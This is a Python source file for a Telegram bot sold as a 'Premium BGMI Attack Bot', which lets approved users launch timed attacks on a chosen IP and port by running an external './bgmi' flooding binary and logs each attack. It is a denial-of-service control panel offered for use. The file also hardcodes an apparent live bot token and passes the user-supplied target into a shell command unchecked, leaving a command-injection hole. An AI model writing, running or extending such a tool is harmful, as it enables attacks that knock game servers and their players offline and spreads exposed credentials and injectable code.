import telebot
import subprocess
import datetime
import os

BOT_TOKEN = "8636140344:AAEUh1GNRu7vD9Rby_0dEIkz-dIODPxdsKA"
ADMIN_ID = "8116319077"

bot = telebot.TeleBot(BOT_TOKEN)

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# ---------------- USERS ----------------

def get_users():
    if not os.path.exists(USER_FILE):
        return []
    with open(USER_FILE,"r") as f:
        return f.read().splitlines()

def add_user(user):
    users = get_users()
    if user not in users:
        users.append(user)
        with open(USER_FILE,"w") as f:
            for u in users:
                f.write(u+"\n")

def remove_user(user):
    users = get_users()
    if user in users:
        users.remove(user)
        with open(USER_FILE,"w") as f:
            for u in users:
                f.write(u+"\n")

# ---------------- LOGS ----------------

def log_attack(user,target,port,time):
    with open(LOG_FILE,"a") as f:
        f.write(f"{user} | {target} | {port} | {time} | {datetime.datetime.now()}\n")

# ---------------- START ----------------

@bot.message_handler(commands=['start'])
def start(message):
    name = message.from_user.first_name
    bot.reply_to(message,f"""
🔥 Welcome {name}

🤖 Premium BGMI Attack Bot

Commands:

/bgmi <ip> <port> <time>
/myinfo
/help

Admin Commands:
/add
/remove
/allusers
/logs
""")

# ---------------- HELP ----------------

@bot.message_handler(commands=['help'])
def help_cmd(message):

    bot.reply_to(message,"""
📜 Commands

/bgmi <target> <port> <time>
Run attack

/myinfo
Check your info

/mylogs
Your attack logs
""")

# ---------------- INFO ----------------

@bot.message_handler(commands=['myinfo'])
def myinfo(message):

    user=str(message.chat.id)

    role="User"
    if user==ADMIN_ID:
        role="Admin"

    bot.reply_to(message,f"""
👤 USER INFO

ID : {user}
Role : {role}
Approved : {"Yes" if user in get_users() or user==ADMIN_ID else "No"}
""")

# ---------------- ADD USER ----------------

@bot.message_handler(commands=['add'])
def add(message):

    if str(message.chat.id)!=ADMIN_ID:
        return

    try:
        user=message.text.split()[1]
        add_user(user)
        bot.reply_to(message,"✅ User Added")
    except:
        bot.reply_to(message,"Usage : /add userid")

# ---------------- REMOVE USER ----------------

@bot.message_handler(commands=['remove'])
def remove(message):

    if str(message.chat.id)!=ADMIN_ID:
        return

    try:
        user=message.text.split()[1]
        remove_user(user)
        bot.reply_to(message,"❌ User Removed")
    except:
        bot.reply_to(message,"Usage : /remove userid")

# ---------------- ALL USERS ----------------

@bot.message_handler(commands=['allusers'])
def allusers(message):

    if str(message.chat.id)!=ADMIN_ID:
        return

    users=get_users()

    if not users:
        bot.reply_to(message,"No Users")
        return

    text="👥 Approved Users\n\n"

    for u in users:
        text+=u+"\n"

    bot.reply_to(message,text)

# ---------------- LOGS ----------------

@bot.message_handler(commands=['logs'])
def logs(message):

    if str(message.chat.id)!=ADMIN_ID:
        return

    if os.path.exists(LOG_FILE):
        bot.send_document(message.chat.id,open(LOG_FILE,'rb'))

# ---------------- USER LOGS ----------------

@bot.message_handler(commands=['mylogs'])
def mylogs(message):

    user=str(message.chat.id)

    if not os.path.exists(LOG_FILE):
        bot.reply_to(message,"No Logs")
        return

    with open(LOG_FILE) as f:
        data=f.readlines()

    result=""

    for line in data:
        if user in line:
            result+=line

    if result=="":
        result="No Logs"

    bot.reply_to(message,result)

# ---------------- BGMI COMMAND ----------------

@bot.message_handler(commands=['bgmi'])
def bgmi(message):

    user=str(message.chat.id)

    users=get_users()

    if user not in users and user!=ADMIN_ID:
        bot.reply_to(message,"🚫 You are not approved")
        return

    try:

        target=message.text.split()[1]
        port=int(message.text.split()[2])
        time=int(message.text.split()[3])

        if time>600:
            bot.reply_to(message,"Max Time 600s")
            return

        bot.reply_to(message,f"""
🚀 ATTACK STARTED

Target : {target}
Port : {port}
Time : {time}
""")

        log_attack(user,target,port,time)

        subprocess.run(f"./bgmi {target} {port} {time} 100",shell=True)

        bot.reply_to(message,"✅ Attack Finished")

    except:
        bot.reply_to(message,"Usage : /bgmi <ip> <port> <time>")

# ---------------- RUN ----------------

print("Bot Running...")

bot.infinity_polling()
